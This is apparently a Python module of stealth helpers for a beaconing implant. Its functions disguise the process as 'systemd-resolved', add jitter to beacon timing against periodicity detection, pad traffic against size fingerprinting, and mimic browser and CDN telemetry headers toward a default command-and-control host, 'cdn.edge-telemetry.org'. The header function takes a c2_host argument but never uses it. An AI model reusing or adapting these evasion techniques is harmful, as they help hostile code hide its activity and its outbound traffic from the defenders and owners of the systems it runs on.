import sys
import os
import random
import time
import hmac
import hashlib
import string

def masquerade_process(process_name: str = "systemd-resolved"):
    """
    MASK-4: Obfuscates process identity in process list.
    Attempts to rename process title via ctypes on Linux or setproctitle if installed.
    """
    try:
        if sys.platform.startswith("linux"):
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            PR_SET_NAME = 15
            b_name = process_name.encode("utf-8")
            libc.prctl(PR_SET_NAME, b_name, 0, 0, 0)
    except Exception:
        pass

def calculate_jittered_interval(base_interval: float, jitter_pct: float) -> float:
    """
    MASK-5: Calculates random sleep duration with jitter to prevent beacon periodicity detection
    e.g. 10s +- 35% -> interval between 6.5s and 13.5s
    """
    factor = jitter_pct / 100.0
    delta = base_interval * factor
    return max(1.0, random.uniform(base_interval - delta, base_interval + delta))

def generate_dummy_padding(min_bytes: int = 32, max_bytes: int = 128) -> str:
    """
    MASK-5: Generates random variable-length padding to disrupt packet size fingerprinting
    """
    length = random.randint(min_bytes, max_bytes)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_disguised_headers(c2_host: str = "cdn.edge-telemetry.org") -> dict:
    """
    MASK-2: HTTP headers simulating legitimate CDN/browser telemetry beacon
    """
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "X-Edge-Origin": "AMS",
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

def sign_telemetry_payload(trap_id: str, timestamp: float, nonce: str, secret_key: str) -> str:
    """
    MASK-7: Generates HMAC-SHA256 signature for mutual authentication and replay prevention
    """
    data_to_sign = f"{trap_id}:{timestamp}:{nonce}".encode()
    return hmac.new(secret_key.encode(), data_to_sign, hashlib.sha256).hexdigest()
